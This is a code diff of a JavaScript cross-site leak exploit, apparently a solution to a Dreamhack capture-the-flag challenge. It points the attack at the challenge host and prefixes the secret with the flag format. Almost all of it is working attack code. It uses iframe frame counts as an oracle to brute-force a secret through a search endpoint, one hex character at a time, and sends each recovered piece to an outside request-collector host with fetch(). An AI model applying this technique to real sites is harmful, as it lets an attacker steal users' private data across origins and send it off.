@@ -12,9 +12,9 @@ async function req(url) {
         iframe.onload = ()=>{
             frameCount = iframe.contentWindow.frames.length
             if (frameCount==1){
-                resolve;
+                resolve();
             }else{
-                reject;
+                reject();
             }
         };
     });
@@ -23,7 +23,7 @@ async function req(url) {
 async function search(query) {
     try {
         await req(
-          `http://localhost:8000/search?query=${query}`
+          `http://host3.dreamhack.games:14942/search?query=${query}`
         );
         return true;
     } catch (e) {
@@ -34,13 +34,13 @@ async function search(query) {
 async function exploit() {
     let chars = "0123456789abcdef"
     let secret_length = 32;
-    let secret = "";
+    let secret = "DH{";
 
     for (let i = 0; i < secret_length; i++) {
         for (let c of chars) {
             if (await search(secret + c)) {
                 secret += c;
-                fetch(`https://sefjgva.request.dreamhack.games/${secret}`)
+                fetch(`https://sefjgva.request.dreamhack.games/${secret}`).then((response) => "");
                 break;
             }
         }
